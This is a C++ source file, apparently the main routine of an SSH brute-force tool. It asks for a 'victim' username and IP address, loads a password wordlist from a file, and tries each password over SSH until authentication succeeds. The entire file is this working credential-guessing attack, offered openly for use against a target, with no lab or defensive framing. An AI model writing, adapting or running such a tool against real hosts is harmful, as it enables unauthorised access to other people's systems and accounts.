#include <iostream>
#include <string>
#include <thread>
#include <vector>
#include "Host.h"
#include "Utils/WordlistToVector.h"
#include "Banner.h"

using namespace std;


int main(){
    ssh_session session;
    int check;
    string ip;
    string user;
    string file;
    cout<<endl;
    banner();
    yellow("\n[+] Provide Information about your victim\n\n");
    cout<<"User: ";
    cin>>user;
    cout<<"IP: ";   
    cin>>ip;
    cout<<"Path of Wordlist: ";
    cin>>file;
    vector<string> passwords = readPasswordsFromFile(file);
    cout<<endl;
    SSHHost ssh_host(ip,user);
    for (int i = 0; i < passwords.size(); i++) {
        session = ssh_host.SSHConnection(ssh_host.ip,ssh_host.user);
        printf("Password: %d/%lu\r",i+1,passwords.size());
        fflush(stdout);
        check = ssh_host.SSHAuth(session,ssh_host.user,passwords[i]);
        if(check == SSH_AUTH_SUCCESS){
            ssh_disconnect(session);
            break;
        }}
    return 0;
}
